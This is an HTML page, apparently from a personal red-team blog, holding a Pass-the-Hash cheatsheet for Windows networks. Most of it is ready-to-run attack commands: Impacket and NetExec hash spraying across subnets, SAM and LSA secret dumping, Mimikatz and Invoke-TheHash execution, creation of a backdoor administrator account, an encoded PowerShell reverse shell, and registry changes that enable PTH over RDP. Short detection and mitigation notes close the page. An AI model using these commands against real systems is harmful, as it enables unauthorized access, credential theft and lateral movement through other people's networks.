@@ -1,0 +1,398 @@
+<!DOCTYPE HTML>
+<html>
+
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="pragma" content="no-cache">
+  <meta http-equiv="cache-control" content="no-cache">
+  <meta http-equiv="expires" content="0">
+  
+    <title>
+      vipa0z</title>
+  <meta name="author" content="vipa0z">
+  
+  <meta name="description" content="Documenting the mechanics of system failure through red team tactics, CTF writeups, malware analysis, and the path into deeper systems hacking.">
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  
+  <meta property="og:site_name" content="vipa0z"/>
+
+  
+    <meta property="og:image" content="favicon.png"/>
+  
+
+  
+    <link rel="alternative" href="/atom.xml" title="vipa0z" type="application/atom+xml">
+  
+  
+  
+  <link rel="stylesheet" href="/css/bootstrap.min.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/font-awesome.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/responsive.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/highlight.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/prism.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/google-fonts.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/gitbook.css" media="screen" type="text/css">
+  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+
+  <script src="/js/jquery-2.0.3.min.js"></script>
+  <meta name="title" content="vipa0z">
+  <!-- analytics -->
+  
+
+        <!--  favicon/indexing -->
+        <link rel="icon" type="image/png" href="/favicon.ico/favicon-96x96.png" sizes="96x96" />
+        <link rel="icon" type="image/svg+xml" href="/favicon.ico/favicon.svg" />
+        <link rel="shortcut icon" href="/favicon.ico/favicon.ico" />
+        <link rel="apple-touch-icon" sizes="180x180" href="/favicon.ico/apple-touch-icon.png" />
+        <link rel="manifest" href="/favicon.ico/site.webmanifest" />
+
+<meta name="generator" content="Hexo 7.3.0"></head>
+ <body>  
+  <nav id="main-nav" class="navbar navbar-inverse navbar-fixed-top" role="navigation">
+	<div class="container">
+		<button type="button" class="navbar-header navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
+			<span class="sr-only">Toggle navigation</span>
+			<span class="icon-bar"></span>
+			<span class="icon-bar"></span>
+			<span class="icon-bar"></span>
+		</button>
+		<a class="navbar-brand" href="/">
+			vipa0z
+		</a>
+		<div class="collapse navbar-collapse nav-menu">
+			<ul class="nav navbar-nav">
+				
+					<li>
+						<a href="/index" title="Home">
+							<i class="fa fa-home"></i>Home
+						</a>
+					</li>
+					
+					<li>
+						<a href="/archives" title="All the articles.">
+							<i class="fa fa-archive"></i>Archives
+						</a>
+					</li>
+					
+					<li>
+						<a href="/tags" title="All the tags.">
+							<i class="fa fa-tags"></i>Tags
+						</a>
+					</li>
+					
+					<li>
+						<a href="/cheatsheets/" title="Cheatsheets_and_Notes">
+							<i class="fa fa-book"></i>Docs
+						</a>
+					</li>
+					
+					<li>
+						<a href="/about" title="About me.">
+							<i class="fa fa-user"></i>About Me
+						</a>
+					</li>
+					
+						<!-- Theme Toggle -->
+						<li>
+							<a href="#" class="theme-toggle-btn" aria-label="Toggle theme">
+								<i class="fa fa-moon-o"></i> Theme
+							</a>
+						</li>
+			</ul>
+		</div>
+	</div> <!-- container -->
+</nav>
+<div class="clearfix"></div>
+  <div class="container">
+  	<div class="content">
+    	 
+	
+		<div class="page-header">
+			<h1> </h1>
+		</div>
+	
+
+
+
+<div class="row page">
+	<!-- cols -->
+	
+	<div class="col-md-12"> 
+	
+
+	<!-- content -->
+	<div class="mypage">		
+	  		
+
+	  <h1 id="Pass-the-Hash-PTH"><a href="#Pass-the-Hash-PTH" class="headerlink" title="Pass-the-Hash (PTH)"></a>Pass-the-Hash (PTH)</h1><p>Authenticate to remote systems using NTLM password hashes without knowing the cleartext password.<br>PTH is a powerful lateral movement technique that works because Windows accepts NTLM hashes for authentication.</p>
+<h2 id="Quick-Reference"><a href="#Quick-Reference" class="headerlink" title="Quick Reference"></a>Quick Reference</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Impacket psexec</span></span><br><span class="line">impacket-psexec administrator@10.10.10.10 -hashes :NTHASH</span><br><span class="line"></span><br><span class="line"><span class="comment"># NetExec PTH</span></span><br><span class="line">nxc smb 10.10.10.0/24 -u administrator -H NTHASH</span><br><span class="line"></span><br><span class="line"><span class="comment"># xfreerdp PTH</span></span><br><span class="line">xfreerdp /u:administrator /pth:NTHASH /v:10.10.10.10</span><br></pre></td></tr></table></figure>
+
+<h2 id="Impacket-PTH"><a href="#Impacket-PTH" class="headerlink" title="Impacket PTH"></a>Impacket PTH</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># psexec</span></span><br><span class="line">impacket-psexec administrator@10.10.10.10 -hashes :NTHASH</span><br><span class="line">impacket-psexec domain/administrator@10.10.10.10 -hashes :NTHASH</span><br><span class="line"></span><br><span class="line"><span class="comment"># wmiexec</span></span><br><span class="line">impacket-wmiexec administrator@10.10.10.10 -hashes :NTHASH</span><br><span class="line"></span><br><span class="line"><span class="comment"># smbexec</span></span><br><span class="line">impacket-smbexec administrator@10.10.10.10 -hashes :NTHASH</span><br><span class="line"></span><br><span class="line"><span class="comment"># atexec</span></span><br><span class="line">impacket-atexec administrator@10.10.10.10 -hashes :NTHASH <span class="built_in">whoami</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># With LM hash (if available)</span></span><br><span class="line">impacket-psexec administrator@10.10.10.10 -hashes LMHASH:NTHASH</span><br></pre></td></tr></table></figure>
+
+<h2 id="NetExec-PTH"><a href="#NetExec-PTH" class="headerlink" title="NetExec PTH"></a>NetExec PTH</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Single host</span></span><br><span class="line">nxc smb 10.10.10.10 -u administrator -H NTHASH</span><br><span class="line"></span><br><span class="line"><span class="comment"># Subnet spray</span></span><br><span class="line">nxc smb 10.10.10.0/24 -u administrator -H NTHASH</span><br><span class="line"></span><br><span class="line"><span class="comment"># Local authentication</span></span><br><span class="line">nxc smb 10.10.10.0/24 -u administrator -H NTHASH --local-auth</span><br><span class="line"></span><br><span class="line"><span class="comment"># Execute command</span></span><br><span class="line">nxc smb 10.10.10.10 -u administrator -H NTHASH -x <span class="built_in">whoami</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Dump SAM</span></span><br><span class="line">nxc smb 10.10.10.10 -u administrator -H NTHASH --sam</span><br><span class="line"></span><br><span class="line"><span class="comment"># Dump LSA secrets</span></span><br><span class="line">nxc smb 10.10.10.10 -u administrator -H NTHASH --lsa</span><br><span class="line"></span><br><span class="line"><span class="comment"># Check admin access (look for Pwn3d!)</span></span><br><span class="line">nxc smb 10.10.10.0/24 -u administrator -H NTHASH</span><br></pre></td></tr></table></figure>
+
+<h2 id="Mimikatz-PTH-Windows"><a href="#Mimikatz-PTH-Windows" class="headerlink" title="Mimikatz PTH (Windows)"></a>Mimikatz PTH (Windows)</h2><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Start Mimikatz</span></span><br><span class="line">.\mimikatz.exe</span><br><span class="line"></span><br><span class="line"><span class="comment"># Enable debug privilege</span></span><br><span class="line">mimikatz <span class="comment"># privilege::debug</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Pass-the-hash to spawn cmd</span></span><br><span class="line">mimikatz <span class="comment"># sekurlsa::pth /user:administrator /ntlm:NTHASH /domain:domain.local /run:cmd.exe</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Pass-the-hash to spawn PowerShell</span></span><br><span class="line">mimikatz <span class="comment"># sekurlsa::pth /user:administrator /ntlm:NTHASH /domain:domain.local /run:powershell.exe</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Access remote share from spawned shell</span></span><br><span class="line">net use \\<span class="number">10.10</span>.<span class="number">10.10</span>\C<span class="variable">$</span> /user:administrator</span><br></pre></td></tr></table></figure>
+
+<h2 id="Invoke-TheHash-PowerShell"><a href="#Invoke-TheHash-PowerShell" class="headerlink" title="Invoke-TheHash (PowerShell)"></a>Invoke-TheHash (PowerShell)</h2><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Import module</span></span><br><span class="line"><span class="built_in">Import-Module</span> .\<span class="built_in">Invoke-TheHash</span>.psd1</span><br><span class="line"></span><br><span class="line"><span class="comment"># SMB command execution</span></span><br><span class="line"><span class="built_in">Invoke-SMBExec</span> <span class="literal">-Target</span> <span class="number">10.10</span>.<span class="number">10.10</span> <span class="literal">-Domain</span> domain.local <span class="literal">-Username</span> administrator <span class="literal">-Hash</span> NTHASH <span class="literal">-Command</span> <span class="string">&quot;whoami&quot;</span> <span class="literal">-Verbose</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Create user and add to admins</span></span><br><span class="line"><span class="built_in">Invoke-SMBExec</span> <span class="literal">-Target</span> <span class="number">10.10</span>.<span class="number">10.10</span> <span class="literal">-Domain</span> domain.local <span class="literal">-Username</span> administrator <span class="literal">-Hash</span> NTHASH <span class="literal">-Command</span> <span class="string">&quot;net user hacker Password123! /add &amp;&amp; net localgroup administrators hacker /add&quot;</span> <span class="literal">-Verbose</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># WMI command execution</span></span><br><span class="line"><span class="built_in">Invoke-WMIExec</span> <span class="literal">-Target</span> <span class="number">10.10</span>.<span class="number">10.10</span> <span class="literal">-Domain</span> domain.local <span class="literal">-Username</span> administrator <span class="literal">-Hash</span> NTHASH <span class="literal">-Command</span> <span class="string">&quot;whoami&quot;</span> <span class="literal">-Verbose</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Reverse shell</span></span><br><span class="line"><span class="built_in">Invoke-WMIExec</span> <span class="literal">-Target</span> <span class="number">10.10</span>.<span class="number">10.10</span> <span class="literal">-Domain</span> domain.local <span class="literal">-Username</span> administrator <span class="literal">-Hash</span> NTHASH <span class="literal">-Command</span> <span class="string">&quot;powershell -e BASE64_ENCODED_SHELL&quot;</span> <span class="literal">-Verbose</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="RDP-Pass-the-Hash"><a href="#RDP-Pass-the-Hash" class="headerlink" title="RDP Pass-the-Hash"></a>RDP Pass-the-Hash</h2><h3 id="Enable-Restricted-Admin-Mode"><a href="#Enable-Restricted-Admin-Mode" class="headerlink" title="Enable Restricted Admin Mode"></a>Enable Restricted Admin Mode</h3><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"># Add registry key</span><br><span class="line">reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d <span class="number">0</span>x0 /f</span><br></pre></td></tr></table></figure>
+
+<h3 id="Connect-with-PTH"><a href="#Connect-with-PTH" class="headerlink" title="Connect with PTH"></a>Connect with PTH</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># xfreerdp</span></span><br><span class="line">xfreerdp /u:administrator /pth:NTHASH /v:10.10.10.10</span><br><span class="line"></span><br><span class="line"><span class="comment"># With domain</span></span><br><span class="line">xfreerdp /u:administrator /pth:NTHASH /d:domain.local /v:10.10.10.10</span><br><span class="line"></span><br><span class="line"><span class="comment"># Ignore certificate</span></span><br><span class="line">xfreerdp /u:administrator /pth:NTHASH /v:10.10.10.10 /cert-ignore</span><br></pre></td></tr></table></figure>
+
+<h2 id="Evil-WinRM-PTH"><a href="#Evil-WinRM-PTH" class="headerlink" title="Evil-WinRM PTH"></a>Evil-WinRM PTH</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Connect with hash</span></span><br><span class="line">evil-winrm -i 10.10.10.10 -u administrator -H NTHASH</span><br><span class="line"></span><br><span class="line"><span class="comment"># With domain</span></span><br><span class="line">evil-winrm -i 10.10.10.10 -u administrator@domain.local -H NTHASH</span><br></pre></td></tr></table></figure>
+
+<h2 id="Common-Workflow"><a href="#Common-Workflow" class="headerlink" title="Common Workflow"></a>Common Workflow</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Step 1: Obtain NTLM hash</span></span><br><span class="line"><span class="comment"># From SAM dump, NTDS.dit, or credential dumping</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Step 2: Test hash validity</span></span><br><span class="line">nxc smb 10.10.10.10 -u administrator -H NTHASH</span><br><span class="line"></span><br><span class="line"><span class="comment"># Step 3: Check for admin access</span></span><br><span class="line">nxc smb 10.10.10.0/24 -u administrator -H NTHASH</span><br><span class="line"></span><br><span class="line"><span class="comment"># Step 4: Execute commands or get shell</span></span><br><span class="line">impacket-psexec administrator@10.10.10.10 -hashes :NTHASH</span><br><span class="line"></span><br><span class="line"><span class="comment"># Step 5: Dump more credentials</span></span><br><span class="line">nxc smb 10.10.10.10 -u administrator -H NTHASH --sam --lsa</span><br></pre></td></tr></table></figure>
+
+<h2 id="Lateral-Movement-with-PTH"><a href="#Lateral-Movement-with-PTH" class="headerlink" title="Lateral Movement with PTH"></a>Lateral Movement with PTH</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Spray hash across subnet</span></span><br><span class="line">nxc smb 10.10.10.0/24 -u administrator -H NTHASH</span><br><span class="line"></span><br><span class="line"><span class="comment"># Test local admin password reuse</span></span><br><span class="line">nxc smb 10.10.10.0/24 -u administrator -H NTHASH --local-auth</span><br><span class="line"></span><br><span class="line"><span class="comment"># Execute command on multiple hosts</span></span><br><span class="line">nxc smb 10.10.10.0/24 -u administrator -H NTHASH -x <span class="string">&quot;whoami&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Dump SAM from all accessible hosts</span></span><br><span class="line">nxc smb 10.10.10.0/24 -u administrator -H NTHASH --sam</span><br></pre></td></tr></table></figure>
+
+<h2 id="Notes"><a href="#Notes" class="headerlink" title="Notes"></a>Notes</h2><p><strong>How PTH Works:</strong></p>
+<p>Windows NTLM authentication accepts password hashes directly:</p>
+<ol>
+<li>Client sends username to server</li>
+<li>Server sends challenge</li>
+<li>Client encrypts challenge with password hash</li>
+<li>Server verifies encrypted challenge</li>
+</ol>
+<p>Since the hash itself is used for encryption, knowing the hash is equivalent to knowing the password for NTLM authentication.</p>
+<p><strong>Requirements:</strong></p>
+<ul>
+<li>NTLM hash of target account</li>
+<li>SMB (445&#x2F;TCP) or other service accepting NTLM auth</li>
+<li>Account must have appropriate permissions</li>
+<li>Target must allow NTLM authentication</li>
+</ul>
+<p><strong>UAC Limitations:</strong></p>
+<p>UAC restricts PTH for local accounts:</p>
+<ul>
+<li>Only RID 500 (built-in Administrator) can PTH by default</li>
+<li>Other local admins blocked unless <code>LocalAccountTokenFilterPolicy=1</code></li>
+<li>Domain accounts not affected by this restriction</li>
+<li>Exception: If <code>FilterAdministratorToken=1</code>, even RID 500 is blocked</li>
+</ul>
+<p><strong>Registry Keys:</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># Allow PTH for all local admins</span><br><span class="line">HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\LocalAccountTokenFilterPolicy = 1</span><br><span class="line"></span><br><span class="line"># Block PTH for RID 500</span><br><span class="line">HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\FilterAdministratorToken = 1</span><br></pre></td></tr></table></figure>
+
+<p><strong>Hash Formats:</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># Full format (LM:NTLM)</span><br><span class="line">aad3b435b51404eeaad3b435b51404ee:88ad09182de639ccc6579eb0849751cf</span><br><span class="line"></span><br><span class="line"># NTLM only (most common)</span><br><span class="line">88ad09182de639ccc6579eb0849751cf</span><br><span class="line"></span><br><span class="line"># Impacket format (colon prefix for NTLM only)</span><br><span class="line">:88ad09182de639ccc6579eb0849751cf</span><br></pre></td></tr></table></figure>
+
+<p><strong>Common Hash Sources:</strong></p>
+<ul>
+<li>SAM database dump</li>
+<li>NTDS.dit extraction</li>
+<li>LSASS memory dump</li>
+<li>DCSync attack</li>
+<li>Kerberoasting (after cracking)</li>
+<li>ASREP roasting (after cracking)</li>
+</ul>
+<p><strong>Restricted Admin Mode (RDP):</strong></p>
+<p>Required for RDP PTH:</p>
+<ul>
+<li>Disabled by default</li>
+<li>Must be enabled via registry</li>
+<li>Credentials not sent to remote system</li>
+<li>More secure but enables PTH</li>
+</ul>
+<p><strong>Tools Comparison:</strong></p>
+<table>
+<thead>
+<tr>
+<th>Tool</th>
+<th>Protocol</th>
+<th>Shell Type</th>
+<th>Notes</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>psexec</td>
+<td>SMB</td>
+<td>Interactive</td>
+<td>Creates service</td>
+</tr>
+<tr>
+<td>wmiexec</td>
+<td>WMI</td>
+<td>Semi-interactive</td>
+<td>Fileless</td>
+</tr>
+<tr>
+<td>smbexec</td>
+<td>SMB</td>
+<td>Semi-interactive</td>
+<td>Uses cmd.exe</td>
+</tr>
+<tr>
+<td>atexec</td>
+<td>Task Scheduler</td>
+<td>Non-interactive</td>
+<td>Single command</td>
+</tr>
+<tr>
+<td>evil-winrm</td>
+<td>WinRM</td>
+<td>Interactive</td>
+<td>PowerShell remoting</td>
+</tr>
+</tbody></table>
+<p><strong>Detection:</strong></p>
+<p>Event IDs to monitor:</p>
+<ul>
+<li>4624: Logon (Type 3 &#x3D; Network)</li>
+<li>4672: Special privileges assigned</li>
+<li>4648: Logon using explicit credentials</li>
+<li>4768&#x2F;4769: Kerberos ticket requests (if Kerberos used)</li>
+</ul>
+<p>Indicators:</p>
+<ul>
+<li>Logon from unusual source IPs</li>
+<li>Lateral movement patterns</li>
+<li>Multiple failed then successful logons</li>
+<li>Admin account used from workstation</li>
+</ul>
+<p><strong>LAPS Mitigation:</strong></p>
+<p>Local Administrator Password Solution (LAPS):</p>
+<ul>
+<li>Randomizes local admin passwords</li>
+<li>Different password per machine</li>
+<li>Prevents password reuse</li>
+<li>Mitigates PTH lateral movement</li>
+</ul>
+<p><strong>Best Practices:</strong></p>
+<ol>
+<li>Test hash before full attack</li>
+<li>Use local-auth flag for local accounts</li>
+<li>Check for Pwn3d! indicator (admin access)</li>
+<li>Document all systems accessed</li>
+<li>Clean up artifacts (services, tasks)</li>
+<li>Prefer WMI&#x2F;WinRM over SMB (less artifacts)</li>
+</ol>
+<p><strong>Kerberos vs NTLM:</strong></p>
+<p>PTH only works with NTLM:</p>
+<ul>
+<li>Kerberos uses tickets, not hashes</li>
+<li>Use Pass-the-Ticket for Kerberos</li>
+<li>Many environments still support NTLM</li>
+<li>NTLM often fallback when Kerberos fails</li>
+</ul>
+<p><strong>Privilege Levels:</strong></p>
+<ul>
+<li>Local Admin: Full control of single machine</li>
+<li>Domain Admin: Full control of domain</li>
+<li>Enterprise Admin: Full control of forest</li>
+<li>Service accounts: Varies by permissions</li>
+</ul>
+<p><strong>Common Targets:</strong></p>
+<ul>
+<li>Workstations (lateral movement)</li>
+<li>Servers (data access)</li>
+<li>Domain Controllers (domain compromise)</li>
+<li>File servers (data exfiltration)</li>
+<li>Database servers (sensitive data)</li>
+</ul>
+<p><strong>Troubleshooting:</strong></p>
+<ul>
+<li>If PTH fails: Check UAC settings</li>
+<li>If “Access Denied”: Account may not have admin rights</li>
+<li>If “Network path not found”: Check firewall&#x2F;SMB</li>
+<li>If RDP fails: Enable Restricted Admin Mode</li>
+</ul>
+<p><strong>Defensive Recommendations:</strong></p>
+<ul>
+<li>Implement LAPS</li>
+<li>Disable NTLM where possible</li>
+<li>Enable SMB signing</li>
+<li>Monitor for lateral movement</li>
+<li>Use tiered admin model</li>
+<li>Implement credential guard</li>
+<li>Regular password rotation</li>
+<li>Least privilege principle</li>
+</ul>
+
+	  <div class="article-footer-copyright">
+
+</div>
+
+	</div>
+
+	
+	
+	<div>
+  	<center>
+
+	<div class="pagination">
+
+    
+</div>
+
+
+    </center>
+	</div>
+	
+	<!-- comment -->
+	<!--
+-->
+	
+	
+	
+	</div> <!-- col-md-9/col-md-12 -->
+
+
+		
+
+</div><!-- row -->
+
+<!--
+ -->
+
+
+
+	</div>
+  </div>
+  <div class="container-narrow">
+  <footer> <p>
+  
+  &copy; 2025 vipa0z's Blog
+  
+</p>
+ </footer>
+</div> <!-- container-narrow -->
+  
+
+
+  
+<a id="gotop" href="#">   
+  <span>⬆︎TOP</span>
+</a>
+
+<script src="/js/jquery.imagesloaded.min.js"></script>
+<script src="/js/gallery.js"></script>
+<script src="/js/bootstrap.min.js"></script>
+<script src="/js/main.js"></script>
+<script src="/js/search.js"></script> 
+
+
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+(function($){
+  $('.fancybox').fancybox();
+})(jQuery);
+</script>
+
+
+
+   <script type="text/javascript">      
+     var search_path = "search.xml";
+	 if (search_path.length == 0) {
+	 	search_path = "search.xml";
+	 }
+	 var path = "/" + search_path;
+     searchFunc(path, 'local-search-input', 'local-search-result');
+   </script>
+
+  <script src="/js/theme-toggle.js"></script>
+</body>
+   </html>
